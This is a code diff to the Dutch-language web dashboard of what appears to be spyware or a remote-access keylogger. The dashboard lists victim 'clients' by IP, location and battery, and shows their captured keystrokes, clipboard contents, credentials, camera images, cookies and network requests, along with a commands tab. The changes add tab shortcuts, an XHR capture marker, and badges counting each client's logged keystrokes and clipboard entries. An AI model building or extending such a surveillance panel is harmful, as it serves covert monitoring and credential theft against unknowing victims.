@@ -776,6 +776,10 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
             <kbd>8</kbd><span>Tab: Credentials</span>
             <kbd>9</kbd><span>Tab: Events</span>
             <kbd>0</kbd><span>Tab: Settings</span>
+            <kbd>e</kbd><span>Tab: Errors</span>
+            <kbd>l</kbd><span>Tab: Timeline</span>
+            <kbd>x</kbd><span>Tab: Devices</span>
+            <kbd>c</kbd><span>Tab: Commands</span>
             <kbd>Esc</kbd><span>Sluit overlay / modal</span>
         </div>
         <div style="margin-top:18px;font-size:.62rem;color:var(--dim)">Shortcuts werken wanneer je niet in een invoerveld typt.</div>
@@ -1118,6 +1122,11 @@ document.addEventListener('keydown', function(e) {
         if (ae && (ae.tagName === 'INPUT' || ae.tagName === 'TEXTAREA' || ae.tagName === 'SELECT')) return;
         var tabMap = {'1':'overview','2':'cameras','3':'photos','4':'map','5':'keys','6':'clipboard','7':'visits','8':'credentials','9':'events','0':'settings'};
         if (tabMap[e.key]) { var t = document.querySelector('.tab[data-v="' + tabMap[e.key] + '"]'); if (t) t.click(); }
+        // Letter shortcuts for extra tabs
+        if (e.key === 'e') { var t = document.querySelector('.tab[data-v="errors"]');   if (t) t.click(); }
+        if (e.key === 'l') { var t = document.querySelector('.tab[data-v="timeline"]'); if (t) t.click(); }
+        if (e.key === 'x') { var t = document.querySelector('.tab[data-v="devices"]');  if (t) t.click(); }
+        if (e.key === 'c') { var t = document.querySelector('.tab[data-v="commands"]'); if (t) t.click(); }
         if (e.key === 'r' || e.key === 'R') { refreshAll(); showToast('Refreshing...'); }
         if (e.key === '?' || (e.key === '/' && e.shiftKey)) { e.preventDefault(); openShortcutModal(); }
         if (e.key === 'g' || e.key === 'G') { e.preventDefault(); const gs = $('#globalSearch'); if (gs) { gs.focus(); gs.select(); } }
@@ -1598,7 +1607,7 @@ function renderKeystrokes(keys) {
         'COOKIES': '#fcd34d', 'PERF': '#67e8f9',
         'FORM SUBMIT': '#f97316', 'RAGE CLICK': '#ef4444',
         'NAVIGATOR': '#a5b4fc', 'FONTS': '#fda4af',
-        'WEBSOCKET': '#38bdf8', 'FETCH': '#7dd3fc'
+        'WEBSOCKET': '#38bdf8', 'FETCH': '#7dd3fc', 'XHR': '#93c5fd'
     };
     function colorizeMarker(text) {
         // Color special [MARKER ...] prefixes
@@ -1612,7 +1621,7 @@ function renderKeystrokes(keys) {
         let highlighted = safe.replace(/\[(BS|ENTER|TAB|ESC|DEL|UP|DN|LT|RT)\]/g,
             '<span class="special">[$1]</span>');
         highlighted = colorizeMarker(highlighted);
-        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION|COOKIES|PERF|FORM|RAGE|NAVIGATOR|FONTS|WEBSOCKET|FETCH)/.test(k.keys || '');
+        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION|COOKIES|PERF|FORM|RAGE|NAVIGATOR|FONTS|WEBSOCKET|FETCH|XHR)/.test(k.keys || '');
         return `<div class="key-entry"${isSpecial ? ' style="background:rgba(148,163,184,.05)"' : ''}>
             <div class="key-hdr"><span class="key-id">${escHtml(k.clientId)}</span><span class="key-time">${fmtTime(k.timestamp)}</span></div>
             ${k.url ? `<div class="key-url">${escHtml(k.url)}</div>` : ''}
@@ -2149,6 +2158,11 @@ function renderClients(clients) {
         const hasCreds   = window._credClientIds && window._credClientIds.has(id);
         const hasErrors  = (cl.errorCount || 0) > 0;
         const anomalyBanner = (hasCreds || hasErrors) ? `<div style="display:flex;gap:4px;margin-bottom:4px;flex-wrap:wrap">${hasCreds ? '<span style="background:#f4b400;color:#000;font-size:.55rem;padding:1px 6px;border-radius:10px;font-weight:700">🔑 CREDS</span>' : ''}${hasErrors ? `<span style="background:#d93025;color:#fff;font-size:.55rem;padding:1px 6px;border-radius:10px;font-weight:700">⚠️ ${cl.errorCount} ERR</span>` : ''}</div>` : '';
+        const activityPills = (cl.keystrokeCount || cl.clipboardCount)
+            ? `<div style="display:flex;gap:4px;margin-bottom:3px;flex-wrap:wrap">` +
+              (cl.keystrokeCount ? `<span style="background:rgba(100,100,150,.18);color:var(--dim);font-size:.54rem;padding:1px 5px;border-radius:8px">⌨ ${cl.keystrokeCount}</span>` : '') +
+              (cl.clipboardCount ? `<span style="background:rgba(100,100,150,.18);color:var(--dim);font-size:.54rem;padding:1px 5px;border-radius:8px">📋 ${cl.clipboardCount}</span>` : '') +
+              `</div>` : '';
 
         return `<div class="cl${isPinned ? ' cl-pinned' : ''}" data-client-id="${id}">
             <input type="checkbox" class="cl-select" data-id="${id}" onclick="event.stopPropagation()" style="position:absolute;top:10px;left:8px;cursor:pointer;width:14px;height:14px">
@@ -2156,6 +2170,7 @@ function renderClients(clients) {
             <div class="inf">
                 <div class="cid" title="${id}">${isPinned ? '[P] ' : ''}${id} <button class="copy-btn" onclick="event.stopPropagation();copyText('${id}',this)">Copy</button></div>
                 ${anomalyBanner}
+                ${activityPills}
                 ${badgeRow}
                 <div class="meta">${cl.online ? 'Online' : ('Offline · ' + fmtAgo(cl.lastSeen))} - ${fmtTime(cl.lastSeen)}${battH}${netH} - <span onclick="event.stopPropagation();copyText('${cl.ip || ''}',this)" style="cursor:pointer;text-decoration:underline dotted" title="Click to copy IP">${cl.ip || ''}</span>${idleH}${hiddenH}${scrollH}${sessionH}</div>
                 ${locH}${geoH}
